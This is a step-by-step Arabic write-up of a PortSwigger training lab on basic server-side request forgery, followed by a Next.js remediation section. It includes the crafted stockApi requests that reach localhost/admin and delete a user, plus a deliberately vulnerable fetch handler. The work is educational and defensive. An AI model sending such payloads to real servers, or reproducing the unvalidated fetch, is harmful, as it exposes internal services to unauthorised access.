# Lab: Basic SSRF against the local server

> **Category:** SSRF  
> **Difficulty:** APPRENTICE  
> **Lab Link:** [PortSwigger Lab - Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة SSRF (Server-Side Request Forgery) في ميزة فحص المخزون (stock check). التطبيق يقوم بجلب بيانات من نظام داخلي باستخدام رابط يوفره المستخدم. سنقوم بتغيير الرابط للوصول إلى واجهة الإدارة المحلية (`http://localhost/admin`) وحذف المستخدم `carlos`.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: محاولة الوصول المباشر إلى /admin

- جرب زيارة `/admin` مباشرة:

```
https://YOUR-LAB-ID.web-security-academy.net/admin
```

**النتيجة:** يتم حظر الوصول (غير مصرح به)

### الخطوة 2: فهم ميزة فحص المخزون

- اذهب إلى أي منتج في المتجر
- اضغط على زر **Check stock**
- لاحظ أنه يتم إرسال طلب `POST` إلى `/product/stock`

### الخطوة 3: اعتراض الطلب في Burp

- في Burp → **Proxy > HTTP history**
- ابحث عن طلب `POST /product/stock`:

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.1/stock
```

### الخطوة 4: إرسال الطلب إلى Repeater

- زر الماوس الأيمن → **Send to Repeater**

### الخطوة 5: تغيير معامل stockApi

- غيّر قيمة `stockApi` من `http://192.168.0.1/stock` إلى `http://localhost/admin`:

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

### الخطوة 6: إرسال الطلب

- اضغط **Send**

**النتيجة:** يعرض الرد واجهة إدارة المحلي (admin panel) ✅

ستظهر صفحة تحتوي على:

```html
<html>
  <body>
    <h1>Admin Panel</h1>
    <ul>
      <li><a href="/admin/delete?username=carlos">Delete carlos</a></li>
    </ul>
  </body>
</html>
```

### الخطوة 7: تحديد رابط حذف المستخدم

من الرد، نجد أن رابط حذف `carlos` هو:

```
http://localhost/admin/delete?username=carlos
```

### الخطوة 8: تنفيذ طلب الحذف

- غيّر قيمة `stockApi` إلى الرابط أعلاه:

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin/delete?username=carlos
```

### الخطوة 9: إرسال الطلب

- اضغط **Send**

**النتيجة:** تم حذف المستخدم `carlos` ✅

### الخطوة 10: حل المختبر

بعد حذف `carlos`، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هي SSRF؟** | ثغرة تسمح للمهاجم بإجبار الخادم على إرسال طلبات إلى عناوين داخلية أو خارجية |
| **أين الثغرة؟** | معامل `stockApi` يتحكم فيه المستخدم ويستخدم لجلب بيانات دون تحقق |
| **كيف نستغلها؟** | نغير `stockApi` إلى `http://localhost/admin` للوصول إلى الواجهة المحظورة |
| **ماذا يعود الخادم؟** | يقوم الخادم بجلب الصفحة وإرجاعها لنا كما لو كنا نتصفحها مباشرة |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يثق في رابط يوفره المستخدم (`stockApi`) ويقوم بإرسال طلب HTTP إليه دون أي تحقق أو تصفية.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/stock.js
export default function handler(req, res) {
  const { stockApi } = req.body;
  
  // خطأ: إرسال طلب إلى أي عنوان يوفره المستخدم
  fetch(stockApi)
    .then(response => response.text())
    .then(data => res.send(data))
    .catch(err => res.status(500).send('Error'));
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/stock.js
export default async function handler(req, res) {
  const { stockApi } = req.body;
  
  // التصحيح 1: التحقق من أن الرابط يبدأ بنطاق مسموح
  const allowedHosts = ['192.168.0.1', 'internal-api.example.com'];
  const url = new URL(stockApi);
  
  if (!allowedHosts.includes(url.hostname)) {
    return res.status(400).json({ error: 'Invalid stock API URL' });
  }
  
  // التصحيح 2: منع الوصول إلى المسارات الحساسة (مثل /admin)
  const blockedPaths = ['/admin', '/delete'];
  if (blockedPaths.some(path => url.pathname.startsWith(path))) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // التصحيح 3: استخدام قائمة بيضاء للمسارات المسموحة
  const allowedPaths = ['/stock', '/inventory'];
  if (!allowedPaths.some(path => url.pathname === path)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // التصحيح 4: استخدام allowlist للـ IPs والمنافذ
  if (url.port && url.port !== '80' && url.port !== '443') {
    return res.status(400).json({ error: 'Invalid port' });
  }
  
  // التصحيح 5: منع الوصول إلى localhost/127.0.0.1
  const internalIPs = ['localhost', '127.0.0.1', '0.0.0.0', '::1'];
  if (internalIPs.includes(url.hostname)) {
    return res.status(403).json({ error: 'Internal addresses are not allowed' });
  }
  
  // فقط بعد كل الفحوصات، قم بإرسال الطلب
  const response = await fetch(stockApi);
  const data = await response.text();
  res.send(data);
}
```

**الخلاصة:** 
1. استخدم قائمة بيضاء (allowlist) للنطاقات والمسارات المسموحة
2. امنع الوصول إلى `localhost` وعناوين IP الداخلية
3. لا تسمح بالوصول إلى المسارات الحساسة (`/admin`, `/delete`)
4. تحقق من المنفذ (port) المسموح به

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **Allowlist للنطاقات** | حدد النطاقات المسموح للتطبيق بالاتصال بها فقط |
| **منع العناوين الداخلية** | ارفض `localhost`, `127.0.0.1`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` |
| **التحقق من المسار** | امنع الوصول إلى المسارات الحساسة |
| **التحقق من المنفذ** | سمح فقط بالمنافذ 80 و 443 |
| **استخدام URL parser آمن** | تجنب الأخطاء في parsing التي قد تؤدي إلى تجاوز الفلاتر |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
- [SSRF Cheat Sheet](https://portswigger.net/web-security/ssrf)
